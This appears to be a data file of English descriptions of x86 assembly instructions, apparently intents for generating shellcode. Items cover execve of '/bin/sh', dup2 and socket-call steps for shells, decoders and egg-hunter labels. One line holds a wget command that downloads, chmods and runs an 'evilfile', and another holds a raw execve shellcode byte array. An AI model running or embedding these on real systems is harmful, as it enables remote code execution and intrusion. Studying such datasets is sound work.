+jump short to _star label
+jump short to the _start label
+jump short to the .exit label
+jump short to 0x11
+jump short to 0x2c
+jump short to 0x34
+jump short to 0x63
+jump short to the function call_decoder
+jump short to the call_shellcode label
+jump short to the callit label
+jump short to the callme label
+jump short to the cmd label
+jump short to the cycle label
+jump short to cycle label
+jump short to the function decode
+jump short to the decode label
+jump short to the decode_pr label
+jump short to the end label
+jump short to exi label
+jump short to the fileaddress label
+jump short to the formatting label
+jump short to the four label
+jump short to the gotocall label
+jump short to the here label
+jump short to the routine inc_dec
+jump short to the path label
+jump short to the process_shellcode label
+jump short to push_cmd
+jump short to the push_cmd label
+jump short to the read label
+jump short to the rotate label
+jump short to the search label
+jump short to the setup label
+jump short to shellcode
+jump short to stage
+jump short to the stage label
+jump short to the todo label
+jump short to the two label
+jump to the two label
+define the jmp_search label
+jump to 0xd8 it the carry flag is zero
+if not equal jump to the _nex label
+jump to the _next label if the operands of the above comparison are not equals
+jump to 804809a if not equal
+jump to 80480aa if not equal
+if the remainder is not equal to zero jump to local label checkbuzz
+if the remainder is not equal to zero jump to local label checkint
+jump to the address specified by the label loop if the operands are not equals in the previous comparison
+jump to the next_addr label if the operands of the above comparison are not equals
+if not equal jump to the label nextnumber
+jump to the label no_error if not equal
+jump to retry if not equal
+if not equal jump short to the _while_loop
+jump to the _while_loop label if the operands of the above comparison are not equals
+jump to the _dup2_loop label if the previous instruction clears the sign flag
+jump to 2f if the sign flag is zero
+jump to 3f if the sign flag is zero
+jump to decode_pr if not signed
+jump to dup2 if not negative
+jump to the dup2 label if the previous instruction clears the sign flag
+jump to duploop if not negative
+jump to the duploop label if the previous instruction clears the sign flag
+jump to the loop label if the previous instruction clears the sign flag
+jump to the loopinghere label if the previous instruction clears the sign flag
+jump to the _start label if the zero flag is cleared
+jump to 0x41 if not zero
+jump to 0x8 if not zero
+if not zero jump to numeric label 1
+jump to the numeric label 1 if the zero flag is cleared
+jump to the decode label if the zero flag is cleared
+jump to exeunt if not zero
+jump to the exit_on_error label if the zero flag is cleared
+jump to incaddr if not equal
+jump to incaddr if no match
+jump to the l00p label if the zero flag is cleared
+jump to loop if not equal to zero
+jump to the loop label if the zero flag is cleared
+jump to next_addr if not zero
+if not zero jump to the next_cycle label
+jump to the next_cycle label if the zero flag is cleared
+if not 0 then jump to the scan label
+if not zero jump short to the _paren label
+jump short to the _parent label if the zero flag is cleared
+jump short to decode if not zero
+jump short to the decode label if the zero flag is cleared
+if not zero jump to loc_4010e5
+jump to the stage label if the zero flag is cleared
+if not 0 then jump to the top label
+declare the jocker label
+jump to error label if sign flag SF is equal to 1
+jump to the label _close if the zero flag is set
+jump to the label _read if the zero flag is set
+jump to the _start label if the zero flag is set
+jump to 0x8 if zero
+jump to the call_decoded label if the zero flag is set
+if zero jump to the child label
+jump to child if zero
+jump to label child if the zero flag is set
+jump to the child label if the zero flag is set
+jump to decoded if zero
+jump to download if zero
+jump to the download label if the zero flag is set
+jump to the encoded label if the zero flag is set
+jump to the exit label if the zero flag is set
+jump to find_egg if zero
+jump to the find_egg label if the zero flag is set
+jump to the point in the code labeled finished if zero
+if zero jump to the formatting label
+jump to the formatting label if the zero flag is set
+jump to incpage if equal
+if zero jump to the next_cycle label
+jump to the next_cycle label if the zero flag is set
+jump to next_page if zero
+if zero flag is set jump to nomoreargs label
+if zero jump to the shift_decode label
+jump to the shift_decode label if the zero flag is set
+if 0 then jump to loc_402b13
+define key constant equal to 0xdeadbeef
+declare the l00p label
+in L1 call the stack
+in L1 jump short to esp
+define L1 label and jump short to L2
+declare L2 label and call the function pointed by the stack
+define L2 and jump short to esi
+define L2 label and jump to L3 label
+declare L3 and jump to the shellcode
+define the label L3 and jump to edi
+define L3 and jump short to L4 label
+in L4 jump short to the stack pointer
+in L5 jump to the shellcode
+define the label L5 and jump to the location pointed by the stack pointer
+load the effective address of the operation [bp+0x08] into the bx register
+load the effective address of the operation bp+0x0b] into the bx register
+load the effective address of the operation [bp+di+0x32] into the cx register
+load the effective address of the operation [bp+di+0x3e] into the dx register
+load the effective address of the result of the operation [ebx+0xf] into the eax register
+load the effective address of the result of the operation [ebx+17h] into the eax register
+put the address of ebx+8 into eax
+load the effective address of the result of the operation [ecx+0bh] into the eax register
+load the effective address of the result of the operation [ecx+4] into the eax register
+point eax to the start of the shellcode
+point eax to the next byte of the shellcode
+place the value val in eax
+place the address of var in eax
+place the value in var in eax
+load the effective address [zero_reg+3] into eax
+load the effective address of the result of the operation [zero_reg+3] into the eax register
+load the effective address [zero_reg+6] into eax
+load the effective address of the result of the operation [zero_reg+6] into the eax register
+load the effective address [zero_reg+66h] into eax
+load the effective address of the result of the operation [zero_reg+66h] into the eax register
+load the effective address of the operation [ebx+0xb] into the eax register
+load the effective address of the operation [ebp+0x59] into the ebp register
+load the effective address [ebp-8] into ebx
+load the effective address of ebp-8 into the ebx register
+load the effective address [ebp+24] into ebx
+load the effective address of the result of the operation [ebp+24] into the ebx register
+load the effective address [ebp+39] into ebx
+load the effective address of the result of the operation [ebp+39] into the ebx register
+load the effective address of edx+0x4 into ebx
+load the effective address of esi into the ebx register
+point ebx to the start of the shellcode
+point ebx to the next byte of the shellcode
+load the effective address of the result of the operation [esi+13] into the ebx register
+load the effective address of the result of the operation [esi+14] into the ebx register
+load the effective address [esi+15] into ebx
+load the effective address of the result of the operation [esi+15] into the ebx register
+load the effective address of the result of the operation [esi+23] into the ebx register
+load the effective address [esp+1] into ebx
+load the effective address of the result of the operation [esp +1] into the ebx register
+load the effective address of esp into ebx
+load the effective address of esp into the ebx register
+load the effective address [zero_reg+3] into ebx
+load the effective address of the result of the operation [zero_reg+3] into the ebx register
+load the effective address of the result of the operation [eax] into the ecx register
+load the effective address [ebp+28] into ecx
+load the effective address of the result of the operation [ebp+28] into the ecx register
+load the value of ebx+0xff into register ecx
+load the effective address of ebx+8 into ecx
+load the effective address of the result of the operation [esi + 8] into the ecx register
+point ecx to the start of the shellcode
+point ecx to the next byte of the shellcode
+load the effective address [esi+18] into ecx
+load the effective address of the result of the operation [esi+18] into the ecx register
+load the effective address of the result of the operation [esi+22] into the ecx register
+load the effective address of the result of the operation [esi+35] into the ecx register
+load the effective address of the result of the operation [esi+8] into the ecx register
+load the effective address of esp into the ecx register
+load the effective address [zero_reg+117] into ecx
+load the effective address of the result of the operation [zero_reg+117] into the ecx register
+load the effective address [zero_reg+3] into ecx
+load the effective address of the result of the operation [zero_reg+3] into the ecx register
+load the effective address [ebx] into edi
+load the effective address of ebx into the edi register
+place the quantity ebx+4*esi in edi
+load the effective address of [esi + 1] into the edi register
+load the effective address of esi+13 into esi+13
+load the effective address of ebx+12 into edx
+load the effective address of the result of the operation [esi + 12] into the edx register
+point edx to the start of the shellcode
+point edx to the next byte of the shellcode
+load the effective address [esi+26] into edx
+load the effective address of the result of the operation [esi+26] into the edx register
+load the effective address of the result of the operation [esi+30] into the edx register
+load the effective address of the result of the operation [esi+47] into the edx register
+load the effective address [ebp+20] into esi
+load the effective address of the result of the operation [ebp+20] into the esi register
+load the effective address of the result of the operation [esi +4] into the esi register
+load the value of register ebx into register esp
+define len equal to the length of msg
+define len equal to the lenght of the encodedshellcode array
+declare the len label equal to the size of the google variable
+declare the len label equal to the length of shellcode
+allocate a single byte of memory and initialize it to the letter 'c'
+define line as the byte string '/usr/bin/wget http://127.0.0.1:8080/evilfile && /bin/chmod 777 evilfile && ./evilfile', 0x0a
+declare the loader label
+decrement the counter and jump to .3 label if the count is not zero
+decrement ecx and jumps to the 3 label unless decrementing ecx caused its value to become zero
+decrement the ecx register and jump to the bucle label if the counter is not zero
+decrement the count register and jump to check_even_odd if the count is not equal to zero
+decrement the ecx register and jump to the check_even_odd label if the contents of the ecx register is not zero else jump short to the shellcode label
+decrement the ecx register and jump to the decrypt label if the contents of the ecx register is not zero else jump short to the encrypt label
+decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
+decrement the counter and jump to the do_dup label if the count is not zero
+decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack
+decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero
+decrement the counter and jump to the fill label if the count is not zero
+decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
+decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
+decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else point the eax register to the stack register
+decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else jump to the edi register
+decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
+decrement the ecx register and jump to the l2 label if the contents of the ecx register is not zero else point the ebx register to the stack register
+decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
+decrement the ecx register and jump to the l3 label if the contents of the ecx register is not zero else point the ecx register to the stack register
+decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register
+decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else point the edx register to the stack register
+decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
+decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else move the contents of the esp register into the ebx register
+decrement the ecx register and jump to the main_inc label if the contents of the ecx register is not zero else point the ebx register to the stack register
+decrement the counter and jump to the main_loop label if the count is not zero
+decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
+decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
+decrement the ecx register and jump to the ROT_decode label if the contents of the ecx register is not zero else jump short to the Shellcode label
+decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
+declare the loop label
+define the loop label
+declare the loopinghere label
+decrement ecx and jumps to the decode label if the contens of ecx is not zero and the zero flag is set to zero
+decrement the counter and jump to the L1 label if the count is not zero and the zero flag is equal to zero
+decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
+decrement the counter and jump to the L2 label if the count is not zero and the zero flag is set to zero
+decrement the ecx register and jump to the L2 label if the contents of the ecx register is not zero and the zero flag is zero else push the contents of the eax register onto the stack
+decrement the ecx register and jump to the L3 label if the contents of the ecx register is not zero and the zero flag is zero else move the value 7 into the edx register
+decrement ecx and jumps to the Label1 label if the contents of the ecx register is not zero and the zero flag is equal to zero
+decrement ecx and jumps to the next label if ecx is not zero and the zero flag is equal to zero
+decrement the ecx register and jump to the next label if the contents of the ecx register is not zero and the zero flag is zero else jump to the ecx register
+decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
+create label main_inc
+define main_loop label
+create label main_push
+declare the main_push label
+create main label
+define main label
+allocate memory for the marks array of words and initialize all elements to zero
+allocate memory for a 12*10 quad-bytes matrix
+declare the me label
+define me label
+define message byte and initialize it to '/bin/sh'
+define message as the byte string '/bin/sh'
+define the string message and initialize it to '/etc/passwd'
+define message as the byte string '/etc/passwd'
+allocate memory for a null terminated string 'hello\n'
+declare message to contain the bytes 'hello world!'
+define message as array of bytes and initialize it to 0xeb,0x25,0x5e,0x89,0xf7,0x31,0xc0,0x50,0x89,0xe2,0x50,0x83,0xc4,0x03,0x8d,0x76,0x04,0x33,0x06,0x50,0x31,0xc0,0x33,0x07,0x50,0x89,0xe3,0x31,0xc0,0x50,0x8d,0x3b,0x57,0x89,0xe1,0xb0,0x0b,0xcd,0x80,0xe8,0xd6,0xff,0xff,0xff,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68
+move the value of ax into memory at address 1000h
+move the contents of the al register at the memory location specified by the operation [bp+0x07]
+move the contents of the al register at the memory location specified by the operation [bp+0x0a]
+move the contents of the al register at the memory location specified by the operation [bp+0x31]]
+move the contents of the si register at the memory location specified by the operation [bp+0x32]
+move the contents of the bx register at the memory location specified by the operation [bp+0x36]
+move the contents of the bx register at the memory location specified by the operation [bp+0x3a]
+move the contents of the ax register at the memory location specified by the operation [bp+0x3e]
+move edi into the local memory address ebp-4
+move ecx into the address [ebp+12]
+move the contents of ecx into the memory location specified by the operation [ebp+12]
+move the contents of zero_reg into the memory location specified by the operation [ebp+20]
+move zero_reg into the address [ebp+20]
+move the word at the address ax into [ebp+22]
+move the word in ax into the memory location specified by the operation [ebp+22]
+move the contents of eax into address defined by ebp+var_a
+move dl into the address [ebx + 6]
+move 110 into the effective address saved in ebx
+move 123 into the effective address saved in ebx
+move dl into the address [ebx+0xe]
+move eax into ebx+12
+move al into ebx+7
+move ebx into ebx+8
+move 25 decimal into the memory address ecx
+move eax into the address [ecx+4]
+move al into edi register
+move al into the address [esi+22]
+move al into the address [esi+34]
+move esi into the address [esi+35]
+move ebx into the address [esi+39]
+move ebx into the address [esi+43]
+move eax into the address [esi+47]
+move the contents of cl into the byte at memory address esi+eax
+move cl into the address [esp + 1]
+move esp into the address [esp+4]
+move al into the address [esp+57]
+move ah into the address [esp+58]
+move ebx into the address [esp+59]
+move the contents of ebx into the 4 bytes at memory address var
+move the contents of eax into the 4 bytes at memory address var1
+move al into memory address a_letter
+move 0x80 into ah
+move the effective address of byte_tbl+2 to al register
+move the contents of the esi register into the al register
+move 03h into al
+move 04h into al
+move 05h into al
+move 0x1 into lower byte of the eax register
+move 0x01 into al
+move 0x04 into al
+put the syscall 0x5 into the al register
+move 0x06 into al
+move 0x0a into al
+move 0x0b into al
+move the value 0x1 into the al register
+move 0x1 into lower byte of the eax register
+move 0x17 into al
+move 0x1f into al
+put the syscall 0x2 into the al register
+move 0x21 into al
+move 0x2e into al
+move 0x3 into al
+move 0x30 into al
+move 0x33 into al
+move 0x3f into al
+syscall 63
+move the value 0x4 into the al register
+move 0x4 into al
+move 0x42 into al
+move 0x46 into al
+move the value 0x5 into the al register
+move 0x5 into al
+load the syscall value 0x58 for reboot in the al register
+move 0x6 into al
+make the socketcall
+make the systemcall socketcall
+move 0x66 into al
+syscall 102
+system call socketcall
+move 0x7 into al
+put the syscall 0x8 into the al register
+move 0xa2 into al
+execve system call number 11
+mov 0xb into lower byte of eax
+move 0xb into al
+move 0xb5 into al
+move 0xcd into al
+move 0xf into al
+move the value 1 into the al register
+move 1 into al
+transfer the value 10 to the al register
+move 102 into al
+put the syscall 11 into the al register
+move the value 11 into the al register
+move 12 into al
+move 15 into lower byte of the eax register
+move 16 into al
+move 2 into al
+move 20 into al
+move 23 into al
+move 37 into al
+move 39 into al
+store 4 into al
+move 4 into al
+move 5 into al
+move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
+move 54 into al
+move 6 into al
+move 61 into al
+save 63 into al
+move 66h into al
+move 70 into al
+move 72h into al
+move 99 into al
+move data at memory location a_letter into al
+move the effective address of digits+eax into al
+move the byte in edi into the al register
+move the effective address edx+ecx into al
+move the byte 0bh into al
+move the byte at the address 0bh into al
+move the byte at the address 0x1 into al
+move the byte 2ah into al
+move the byte at the address 2ah into al
+move the byte 2h into al
+move the byte at the address 2h into al
+move the byte 3fh into al
+move the byte at the address 3fh into al
+move the byte 3h into al
+move the byte at the address 3h into al
+move the byte 66h into al
+move the byte at the address 66h into al
+move the byte 6h into al
+move the byte at the address 6h into al
+move a byte from the address buff+ecx into al
+move close_syscall into al
+move write_syscall into al
+load the object at the address 1000h into the ax register
+copy thevalue at memory address specified by di into ax
+store the contents at the address pointed by esi into the ax register
+copy my_var contents in ax
+initialize ax to 00
+move value of 0x010ch into the register ax
+move 0x167 into ax
+move 0x169 into ax
+move 0x16a into ax
+move 0x16b into ax
+move 0x16c into ax
+move value of 1 into register ax
+move 102 into ax
+move 1666 into ax
+transfer the immediate constant 45h to ax
+move 8h into ax
+get 9 in the ax
+move bx into ax
+move the contents of bx into ax
+move 0x01 into bl
+move 0x02 into bl
+move 0x04 into bl
+move the value 0x1 into the bl register
+move 0x1 into bl
+move 0x14 into bl
+move 0x2 into bl
+move the value 0x2 into the bl register
+move 0x3 into bl
+move the value 0x4 onto the stack
+move 0x4 into bl
+move 0x5 into bl
+move the value 0x5 into the bl register
+move 0x7 into bl
+move 0x8 into bl
+move 0x9 into bl
+move 0xe into bl
+move 10 into bl
+move 2 into bl
+move 3 into bl
+move the value 3 into the bl register then decrement the contents of the bl register and jump to the l3 label if the result is not zero
+move 4 into bl
+store 5 into bl
+move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
+move the byte at address digits+ebx into bl
+move the byte in eax into bl
+move the byte at the address 0eh into bl
+move cl into bl
+move the contents of the esi register into the bx register
+move 1666 into bx
+get 18 in the bx register
+move the value 20 into bx
+move memory word_value to register bx
+move dl into the byte at address [eax]
+move 2 into the single byte at the address stored in ebx
+move 2 into the single byte at memory location ecx
+move dl into the byte at address [ecx+92]
+move dl into the single byte at the address stored in ecx+92
+move bl into the byte in edi
+move al into the single byte at the address stored in edx+ecx
+move dl into the byte at address [esi + 1]
+move bl into the byte at address [esi]
+move al into the byte at address [esi+11]
+move al into the byte at address [esi+12]
+move al into the byte at address [esi+14]
+move the contents of al into the byte at the memory location specified by the operation [esi+14]
+move al into the byte at address [esi+17]
+move the contents of al into the byte at the memory location specified by the operation [esi+17]
+move al into the byte at address [esi+21]
+move al into the byte at address [esi+7]
+move 0x2e into the byte in esp
+move 0x2f into the byte at address [esp]
+move 0x2f into the byte in esp
+move 0x7f into the byte at address [esp]
+move 0x07 into the byte at address [esp+2]
+move 0x01 into the byte at address [esp+3]
+move 0x11 into the byte at address [esp+3]
+move a byte from bl into memory address hexstr+edx+1
+move a byte from al into memory address hexstr+edx+2
+store the value 5 into the byte at memory location var
+move 0x0b into the byte at address al
+move 0x3f into the byte at address al
+move 0x3f into the byte in al
+move 0xa4 into the byte at address al
+move 0xa4 into the byte in al
+move 11 into the byte at address al
+move 83 into the byte at address al
+move 7 into the byte at address cl
+move 077o into cl
+move 0x1 into cl
+move 0x1e into cl
+move 0x2 into cl
+move the value 0x2 into the cl register
+move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
+move 100 into cl
+move 128 into cl
+move 13 into cl
+move 2 into cl
+move 21 into cl
+move 3 into cl
+move 30 into cl
+move 30 to the cl register
+move 32 into cl
+move 9 into cl
+backup al into cl
+move the contents of the bl register into the contents of the cl register then subtract the value 1 from the cl register and jump to the loop label if the result is not zero
+move the byte at the address [eax] into cl
+move the byte in esi into cl
+move the 3rd element of the byte_table into cl
+move shellcode_length into cl
+move shellcodelen into cl
+move bx to count
+move the contents of the esi register into the cx register
+initialize cx to 01
+move 02001 into cx
+move 0666 into cx
+move 0700 into cx
+move 0x191 into cx
+move 0x1ff into cx
+move 0x2bc into cx
+move the value 0x301 into the cx register
+mov the value 0x3b30 into the cx register
+move 0x401 into cx
+move 0x5309 into cx
+move 0x9ed into cx
+move 0xfff into cx
+move 2001 into cx
+move 2001Q into cx
+move the 4th element of the word_table into cx
+move the 4th element of the array word_table into cx
+move 0x02 into dl
+move 0x09 into dl
+move 0x1 into dl
+move 0x10 into dl
+move 0x14 into dl
+move 0x1c into dl
+move 0x2 into dl
+move 0x7f into dl
+move 0xc into dl
+move 0xd into dl
+move 1+0feh into dl
+move 93 into dl
+move the byte at the address [eax + 1] into dl
+move the byte at the address [eax] into dl
+move the byte in eax into dl
+move the byte at the address [esi + 1] into dl
+move the byte at the address 0ffh into dl
+move the contents stored at the address len into the dl register
+copy the value in var1 into the doubleword starting at the address in eax
+move the 32-bit integer representation of 2 into the doubleword starting at the address in ebx
+move the 32-bit integer representation of 4 into the doubleword starting at address ebx
+move eax into the dword at address [esi + 12]
+move ebx into the dword at address [esi + 8]
+move the value 0x5f657a69 into the double word starting at the address [esp-0x10]
+move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
+move the value 0x61722f6c into the double word starting at the address [esp-0x18]
+move the value 0x656e7265 into the double word starting at the address [esp-0x1c]
+move the value 0x6b2f7379 into the double word starting at the address [esp-0x20]
+move the value 0x732f636f into the double word starting at the address [esp-0x24]
+move the value 0x72702f2f into the double word starting at the address [esp-0x28]
+move the contents of the eax into the double word starting at the address [esp-0x4]
+move the value 0x65636170 into the double word starting at the address [esp-0x8]
+move the value 0x735f6176 into the double word starting at the address [esp-0xc]
+move 0x6374652f into the dword at address [esp-12]
+move 0x6374652f into the dword at the memory location [esp-12]
+move ecx into the doubleword starting at the address esp-4
+move esi into the dword at address [esp-4]
+move the contents of the esi register into the dword at the memory location [esp-4]
+move esi into the doubleword starting at the address esp-4
+move 0x68732f2f into the dword at address [esp-8]
+move 0x68732f2f into the dword at the memory location [esp-8]
+move edi into the doubleword starting at the address esp-8
+move 0x1a4 into dx
+move the value 0x2a1 into the dx register
+move 0xb01 into dx
+move 1222 into dx
+move 132 into dx
+move 16666 into dx
+move _start into eax
+move value of memory address [ebp+8] into eax
+move the 4 bytes in memory at the address contained in ebx into eax
+copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register
+move the contents of memory address ebx+epi*4+2 into eax
+move the contents of memory address ebx+esi into eax
+move the contents of memory address ebx+esi*2+4 into eax
+move 4 bytes at memory address esi-4 into eax
+move the contents of memory address esp into eax
+move the value of register at address esp+4 and store into eax
+move the contents at memory specified by temp into eax
+move the contents at memory address temp1 to eax
+move the contents at memory specified by x to eax
+move the contents at memory address y to eax
+move the contents at memory specified by y to eax
+move the contents at memory specified by z to eax
+move 0ah into eax
+move an ascii linefeed character into eax
+move linefeed character into eax
+move 0x2e323931 into eax
+move 0x2e383631 into eax
+move 0x2f3e20 into eax
+move 0x2f766564 into eax
+move 0x31263e32 into eax
+move 0x33392e31 into eax
+move 0x3f into eax
+move 5 into eax
+move 0x50905090 into eax
+move 0x563ed8b7 into eax
+move 0x66 into eax
+move 0x6c6c756e into eax
+move 0x782f2f into eax
+move the 32-bit value 0x8000 into register eax
+move 0x8b90909d into eax
+move 0x969d8cd0 into eax
+move 0x9a8dd091 into eax
+move 0xb33fb33f into eax
+move 0xdeadc0de into eax
+move 0xfeffff80 into eax
+move 0xffffffff into eax
+code for exit syscall
+exit
+invoke sys_exit
+make the system call exit
+make the system call for exit
+make the system call to terminate the process
+move 1 into eax
+move the value one into eax
+specify exit syscall
+system call exit
+terminate the process
+invoke sys_unlink
+move 10 into eax
+move 10000h into eax register
+invoke sys_socketcall
+get information about the file
+make the system call stat
+make the system call to get information about the file
+stat
+system call stat
+execve
+invoke sys_execve
+load and run the program
+make the system call execve
+make the system to load and run the program
+system call execve
+invoke sys_time
+move 132 to eax 132
+go to file offset
+invoke sys_lseek
+lseek
+make the system call lseek
+make the system call to go to the file offset
+system call lseek
+create a new process
+fork
+invoke sys_fork
+make the system call fork
+make the system call to create a new process
+move the value two into eax
+system call fork
+get the process ID
+getpid
+make the system call getpid
+make the system call to get the process ID
+system call getpid
+get 21 in the eax register
+alarm
+make the system call alarm
+make the system call to set set signal delivery alarm clock
+set signal delivery alarm clock
+system call alarm
+make the system call pause
+make the system call to suspend the process
+pause
+suspend the process until the signal arrives
+system call pause
+invoke sys_read
+make the system call read
+make the system call to read the file
+move 3 to the eax register
+read
+read the file
+specify sys_read call
+system call read
+kill
+make the system call kill
+make the system call to send the signal to another process
+send signal to another process
+system call kill
+invoke sys_write
+make the system call for write
+make the system call to write to the file
+make the system call write
+move 4 into eax
+move 4 to the eax register
+specify sys_write call
+specify sys_write syscall
+system call write
+write
+write to the file
+install signal handel
+make the system call signal
+make the system call to install the signal handler
+signal
+system call signal
+invoke sys_open
+make the system call open
+make the system call to open the file
+open
+open the file
+system call open
+close
+close the file
+invoke sys_close
+make the system call close
+make the system call to close the file
+system call close
+copy file descriptor
+dup2
+make the system call dup2
+make the system call to copy the file descriptor
+system call dup2
+get the parent process ID
+getppid
+make the system call getppid
+make the system call to get the parent process ID
+system call getppid
+get process group
+getpgrp
+make the system call getpgrp
+make the system call to get the process group
+system call getpgrp
+install portable signal handler
+make the system call sigaction
+make the system call to install portable signal handler
+sigaction
+system call sigaction
+make the system call to wait for child for terminate
+make the system call waitpid
+system call waitpid
+wait for child to terminate
+waitpid
+invoke sys_creat
+make the system call mmap
+make the system call to map the memory page to a file
+map the memory page to a file
+mmap
+move decimal number 90 into eax
+system call mmap
+move addr into eax
+move the contents of memory address array+esi*4 into eax
+move b to eax
+move buff to eax
+move the memory address of buffer variable into eax
+move the address of buzz string into eax
+move c to eax
+move childmsg into eax
+copy the contents of ebx into eax register
+copy what is in ebx into eax
+move ebx to eax
+move the address in ebx into eax
+transfer ebx to eax
+move the value in ecx into eax
+move the value of ecx into eax
+move edx into eax
+move the remainder into eax
+move esi into eax
+move stack pointer to eax
+move the address of the current stack pointer into eax
+move the memory address of filecontents variable into eax
+move the address of fizz string into eax
+move key into eax
+move m_src to eax
+move the address of msg string into eax
+move msg1 string into eax
+move the address of msg1 into eax
+move the address of msg2 into eax
+move the address of msg3 into eax
+move mxcsr to eax
+move n_src to eax
+move parentmsg into eax
+move address of response variable into eax
+move the number of bytes of var4 into eax
+place address of buffer into ebp
+move eax to ebp
+move ecx into ebp
+point ebp to the esp register
+point ebp to top of stack
+set the new base pointer
+move the contents at the memory location specified by the result of the operation [ebp-4] into the ebx register
+move the contents of the address [ebp-4] into the ebx register
+move the contents at the memory location specified by the result of the operation [ebp-8] into the ebx register
+move the contents of the address [ebp-8] into the ebx register
+move value at top of the stack to ebx
+move effective address of my_table in ebx
+save the effective address of my_table in ebx
+move the contents at memory address temp2 to ebx
+move the contents at memory address x to ebx
+move the contents at memory address y to ebx
+exit with return code of 0
+return 0 status on exit
+return a code of zero
+specify file descriptor 0 as standard input
+use stdin
+write to the stdin file
+move 0x1 into ebx
+move 0x4 into ebx
+move the 32-bit value 0x40000 into register ebx
+move 0x5 into ebx
+move the value 0xfee1dead into the ebx register
+file descriptor 1 standard output
+invoke subroutine socket
+move 1 into ebx
+specify file descriptor 1 standard output
+use stdout
+write to the stdout file
+move decimal value 10 into ebx
+invoke subroutine bind
+specify file descriptor 2 standard error
+invoke subroutine connect
+move 3 to the ebx register
+move decimal number 3 into ebx
+invoke subroutine listen
+invoke subroutine accept
+move 5 into ebx
+move number 9 into ebx
+move buff to ebx
+move command into ebx
+move dword 0x5090508f into ebx
+move dword 0x50905091 into ebx
+move the address in eax into ebx
+move the contents of the eax register into the ebx register
+move eax into ebx
+move ecx into ebx
+backup ecx into ebx
+move edi into ebx
+move edx into ebx
+move esi into ebx
+move the address of the character on the stack into ebx
+move the contents of the esp register into the ebx register
+point ebx to stack
+push /bin/sh into ebx
+move esp into ebx
+move address of stack pointer into ebx
+move filename into ebx
+move m_src1 to ebx
+move m_src2 to ebx
+move the address of msg string into ebx
+move n to ebx
+move name into ebx
+move address of request variable into ebx
+move sock_reg into ebx
+move the number of bytes of var3 into ebx
+move the value of upcase into ebx
+move the contents of x into ebx
+move zero_reg into ebx
+move the contents at the memory location specified by the result of the operation [ebp+12] into the ecx register
+move the contents of the address [ebp+12] into ecx
+move the 4 bytes of data at address esi+4*eax into ecx
+move the contents of esp into ecx
+move the contents of the esp register into the ecx register
+move effective address of my_table in ecx
+move the contents at memory address temp3 to ecx
+move the contents at memory address x to ecx
+move permissions to read write and execute into ecx
+move 0x0 into ecx
+move 0x1 into ecx
+move 0x88998899 into ecx
+move 1 into ecx
+get 36 in the ecx
+move 4294948047 into ecx
+move the value 672274793 into the ecx register
+move the address of the arguments into ecx
+move the first element of array into ecx
+move the first element in array2 into ecx
+move b to ecx
+move buff to ecx
+move the memory address of buffer variable into ecx
+move the memory address of contents string into ecx
+move the memory address of contents variable into ecx
+move donemsg into ecx
+move eatmsg into ecx
+move eax into ecx
+move edi into ecx
+move edx into ecx
+move the contents of the edx register into the ecx register
+backup edx into ecx
+move esi into ecx
+ecx point to the top of the stack
+move the address of the stack pointer into ecx
+move the contents of esp into ecx
+move address of arguments into ecx
+save the memory location of arg[0] into the ecx register
+move address of stack pointer into ecx
+point ecx to the top of the stack
+move the memory address of our file contents variable into ecx
+put the offset of hello in ecx
+move hexstr into ecx
+move m_src3 to ecx
+move msg to ecx
+move the address of message string into ecx
+move the memory address of message string into ecx
+move starting address of array to ecx
+move readbuffer into ecx
+move address of request variable into ecx
+move address of response variable into ecx
+move rm to ecx
+move rn to ecx
+move the number of bytes of var2 into ecx
+move the contents of y into ecx
+move value the contents of memory address ebp+16 into edi
+move 0x343997b7 into edi
+move 0x978cd092 into edi
+move 0xada67373 into edi
+move 876189623 into edi
+move 884021143 into edi
+move eax into edi
+move the return value of sys_socketcall into edi
+move ecx into edi
+move edx into edi
+move the remainder into edi
+move esp into edi
+place hexstr into edi
+move the 4 bytes of data at address esi+4*ebx into edx
+move the contents of the esp register into the edx register
+move the contents at memory address temp4 to edx
+move the contents at memory address z to edx
+move the value 0x1234567 into the edx register
+move 1 into edx
+move integer 11 to edx
+move 12 to edx
+move 13 into edx
+move decimal 2 into edx
+move decimal number 255 into edx
+move 3 decimal into edx
+move 43 decimal into edx
+move decimal 43 into edx
+move 66729180 into edx
+store 78 decimal into edx
+move 8 decimal into edx
+put 8 into edx
+move number 9 into edx
+move buff to edx
+move bufflen into edx
+move donelen into edx
+move dword 0x65676760 into edx
+move the doubleword 0x65676760 into edx
+move eatlen into edx
+move eax into edx
+backup eax into edx
+move ebp into edx
+move ecx into edx
+move ecx to edx
+move the address of environment variable into edx
+move esi into edx
+move esp into edx
+move the contents of the esp register into the edx register
+move the stack pointer into edx
+move filename into edx
+move hellolen into edx
+move variable len to edx
+move m_src4 to edx
+move n to edx
+move readbuffer into edx
+move readlen into edx
+move address of response variable into edx
+move the contents of src variable into edx
+move the contents of tmp variable into edx
+move the number of bytes of var1 into edx
+move the contents of memory address ebp+12 into esi
+move 0x222933f0 into esi
